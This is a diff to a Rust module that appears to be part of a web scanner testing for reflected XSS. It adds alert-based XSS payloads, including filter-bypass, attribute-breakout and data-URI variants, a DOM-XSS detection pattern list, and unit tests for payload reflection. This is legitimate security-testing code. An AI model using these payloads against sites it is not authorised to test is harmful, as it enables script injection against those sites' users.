@@ -1,3 +1,6 @@
+// Allow unused code for internal constants and helper functions
+#![allow(dead_code)]
+
 use anyhow::Result;
 use log::debug;
 use reqwest::Client;
@@ -16,19 +19,48 @@ fn generate_xss_payloads() -> Vec<String> {
         .collect();
 
     vec![
+        // Basic script injection
         format!("<script>alert('{}')</script>", marker),
+        // Event handler payloads
         format!("<img src=x onerror=alert('{}')>", marker),
         format!("<svg/onload=alert('{}')>", marker),
-        format!("'\"><script>alert('{}')</script>", marker),
-        format!("javascript:alert('{}')", marker),
-        format!("<iframe src=javascript:alert('{}')>", marker),
         format!("<body onload=alert('{}')>", marker),
         format!("<input onfocus=alert('{}') autofocus>", marker),
+        format!("<details open ontoggle=alert('{}')>", marker),
+        format!("<marquee onstart=alert('{}')>", marker),
+        // Attribute breakout
+        format!("'\"><script>alert('{}')</script>", marker),
+        format!("'onmouseover='alert(\"{}\")' x='", marker),
+        // JavaScript protocol
+        format!("javascript:alert('{}')", marker),
+        format!("<iframe src=javascript:alert('{}')>", marker),
+        format!("<a href=\"javascript:alert('{}')\">click</a>", marker),
         // Encoded variants
         format!("%3Cscript%3Ealert('{}')%3C/script%3E", marker),
+        // Filter bypass - nested tags
         format!("<scr<script>ipt>alert('{}')</scr</script>ipt>", marker),
+        // Data URI payload
+        format!("<object data=\"data:text/html,<script>alert('{}')</script>\">", marker),
+        // Template literal injection (modern JS)
+        format!("${{alert('{}')}}", marker),
     ]
 }
+
+/// Additional DOM-based XSS patterns for detection
+const DOM_XSS_PATTERNS: &[&str] = &[
+    "document.write(",
+    "document.writeln(",
+    "innerHTML",
+    "outerHTML",
+    "eval(",
+    "setTimeout(",
+    "setInterval(",
+    "document.cookie",
+    "window.location",
+    "location.href",
+    "location.hash",
+    "location.search",
+];
 
 /// Test for reflected XSS vulnerabilities
 pub async fn test_xss(
@@ -254,6 +286,8 @@ fn is_payload_reflected(response: &str, payload: &str) -> bool {
 mod tests {
     use super::*;
 
+    // ==================== is_payload_reflected Tests ====================
+
     #[test]
     fn test_payload_reflected_exact_match() {
         let response = r#"<html><body><script>alert('test')</script></body></html>"#;
@@ -284,6 +318,90 @@ mod tests {
     }
 
     #[test]
+    fn test_payload_reflected_svg_tag() {
+        let response = r#"<html><body><svg/onload=alert('test123')></body></html>"#;
+        let payload = "<svg/onload=alert('test123')>";
+        assert!(is_payload_reflected(response, payload));
+    }
+
+    #[test]
+    fn test_payload_reflected_iframe_tag() {
+        let response = r#"<html><body><iframe src=javascript:alert('xss')></body></html>"#;
+        let payload = "<iframe src=javascript:alert('xss')>";
+        assert!(is_payload_reflected(response, payload));
+    }
+
+    #[test]
+    fn test_payload_reflected_body_onload() {
+        let response = r#"<html><body onload=alert('test')>Content</body></html>"#;
+        let payload = "<body onload=alert('test')>";
+        assert!(is_payload_reflected(response, payload));
+    }
+
+    #[test]
+    fn test_payload_reflected_input_autofocus() {
+        let response = r#"<html><body><input onfocus=alert('test') autofocus></body></html>"#;
+        let payload = "<input onfocus=alert('test') autofocus>";
+        assert!(is_payload_reflected(response, payload));
+    }
+
+    #[test]
+    fn test_payload_reflected_in_attribute() {
+        let response = r#"<html><body><div class="'\"><script>alert('marker')</script>">Content</div></body></html>"#;
+        let payload = "'\"><script>alert('marker')</script>";
+        assert!(is_payload_reflected(response, payload));
+    }
+
+    #[test]
+    fn test_payload_reflected_with_marker_and_script() {
+        let response = r#"<html><body><script>var x = 'MARKER123';</script></body></html>"#;
+        let payload = "<script>alert('MARKER123')</script>";
+        // This should detect the marker within a script tag
+        assert!(is_payload_reflected(response, payload));
+    }
+
+    #[test]
+    fn test_payload_not_reflected_partial_marker() {
+        let response = r#"<html><body>MARKER but no script tags here</body></html>"#;
+        let payload = "<script>alert('MARKER')</script>";
+        // Marker present but no script tag
+        assert!(!is_payload_reflected(response, payload));
+    }
+
+    #[test]
+    fn test_payload_empty_response() {
+        let response = "";
+        let payload = "<script>alert('test')</script>";
+        assert!(!is_payload_reflected(response, payload));
+    }
+
+    #[test]
+    fn test_payload_empty_payload() {
+        let response = "<html><body>Content</body></html>";
+        let payload = "";
+        // Empty payload technically "exists" in any response (contains returns true)
+        assert!(is_payload_reflected(response, payload));
+    }
+
+    #[test]
+    fn test_payload_partial_encoding_still_dangerous() {
+        // Only some characters encoded, still vulnerable
+        let response = r#"<html><body><script>alert('test')</script></body></html>"#;
+        let payload = "<script>alert('test')</script>";
+        assert!(is_payload_reflected(response, payload));
+    }
+
+    #[test]
+    fn test_payload_double_encoding_safe() {
+        // Double-encoded content is safe
+        let response = r#"<html><body>%26lt%3Bscript%26gt%3Balert('test')%26lt%3B/script%26gt%3B</body></html>"#;
+        let payload = "<script>alert('test')</script>";
+        assert!(!is_payload_reflected(response, payload));
+    }
+
+    // ==================== generate_xss_payloads Tests ====================
+
+    #[test]
     fn test_generate_xss_payloads_not_empty() {
         let payloads = generate_xss_payloads();
         assert!(!payloads.is_empty());
@@ -296,5 +414,157 @@ mod tests {
         let payloads2 = generate_xss_payloads();
         // Different invocations should have different markers (random)
         assert_ne!(payloads1[0], payloads2[0]);
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_script_tag() {
+        let payloads = generate_xss_payloads();
+        assert!(payloads.iter().any(|p| p.contains("<script>")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_img_tag() {
+        let payloads = generate_xss_payloads();
+        assert!(payloads.iter().any(|p| p.contains("<img")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_svg_tag() {
+        let payloads = generate_xss_payloads();
+        assert!(payloads.iter().any(|p| p.contains("<svg")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_iframe_tag() {
+        let payloads = generate_xss_payloads();
+        assert!(payloads.iter().any(|p| p.contains("<iframe")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_event_handlers() {
+        let payloads = generate_xss_payloads();
+        assert!(payloads.iter().any(|p| p.contains("onerror")));
+        assert!(payloads.iter().any(|p| p.contains("onload")));
+        assert!(payloads.iter().any(|p| p.contains("onfocus")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_javascript_protocol() {
+        let payloads = generate_xss_payloads();
+        assert!(payloads.iter().any(|p| p.contains("javascript:")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_attribute_escape() {
+        let payloads = generate_xss_payloads();
+        // Check for attribute-breaking payloads
+        assert!(payloads.iter().any(|p| p.contains("'\"")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_encoded_variants() {
+        let payloads = generate_xss_payloads();
+        // Check for URL-encoded payloads
+        assert!(payloads.iter().any(|p| p.contains("%3C")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_tag_splitting() {
+        let payloads = generate_xss_payloads();
+        // Check for filter bypass payloads (nested tags)
+        assert!(payloads.iter().any(|p| p.contains("<scr<script>")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_details_tag() {
+        let payloads = generate_xss_payloads();
+        assert!(payloads.iter().any(|p| p.contains("<details")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_marquee_tag() {
+        let payloads = generate_xss_payloads();
+        assert!(payloads.iter().any(|p| p.contains("<marquee")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_anchor_tag() {
+        let payloads = generate_xss_payloads();
+        assert!(payloads.iter().any(|p| p.contains("<a href")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_data_uri() {
+        let payloads = generate_xss_payloads();
+        assert!(payloads.iter().any(|p| p.contains("data:text/html")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_template_literal() {
+        let payloads = generate_xss_payloads();
+        assert!(payloads.iter().any(|p| p.contains("${")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_contains_onmouseover() {
+        let payloads = generate_xss_payloads();
+        assert!(payloads.iter().any(|p| p.contains("onmouseover")));
+    }
+
+    #[test]
+    fn test_generate_xss_payloads_marker_length() {
+        let payloads = generate_xss_payloads();
+        // Each payload should contain an 8-character marker
+        for payload in &payloads {
+            if payload.contains("alert('") {
+                // Extract marker between alert(' and ')
+                if let Some(start) = payload.find("alert('") {
+                    if let Some(end) = payload[start + 7..].find('\'') {
+                        let marker = &payload[start + 7..start + 7 + end];
+                        assert_eq!(marker.len(), 8, "Marker should be 8 characters");
+                        assert!(marker.chars().all(|c| c.is_ascii_alphanumeric()), "Marker should be alphanumeric");
+                    }
+                }
+            }
+        }
+    }
+
+    // ==================== Edge Case Tests ====================
+
+    #[test]
+    fn test_payload_reflected_case_sensitive() {
+        // XSS detection should be case-sensitive for exact matches
+        let response = r#"<html><body><SCRIPT>alert('test')</SCRIPT></body></html>"#;
+        let payload = "<script>alert('test')</script>";
+        // Uppercase tags should not match lowercase payload exactly
+        assert!(!is_payload_reflected(response, payload));
+    }
+
+    #[test]
+    fn test_payload_reflected_in_json_response() {
+        let response = r#"{"name": "<script>alert('test')</script>", "status": "ok"}"#;
+        let payload = "<script>alert('test')</script>";
+        assert!(is_payload_reflected(response, payload));
+    }
+
+    #[test]
+    fn test_payload_reflected_in_xml_response() {
+        let response = r#"<?xml version="1.0"?><data><name><script>alert('test')</script></name></data>"#;
+        let payload = "<script>alert('test')</script>";
+        assert!(is_payload_reflected(response, payload));
+    }
+
+    #[test]
+    fn test_payload_with_newlines() {
+        let response = "<html><body>\n<script>\nalert('test')\n</script>\n</body></html>";
+        let payload = "<script>\nalert('test')\n</script>";
+        assert!(is_payload_reflected(response, payload));
+    }
+
+    #[test]
+    fn test_payload_with_unicode() {
+        let response = r#"<html><body><script>alert('\u0048\u0065\u006c\u006c\u006f')</script></body></html>"#;
+        let payload = r#"<script>alert('\u0048\u0065\u006c\u006c\u006f')</script>"#;
+        assert!(is_payload_reflected(response, payload));
     }
 }
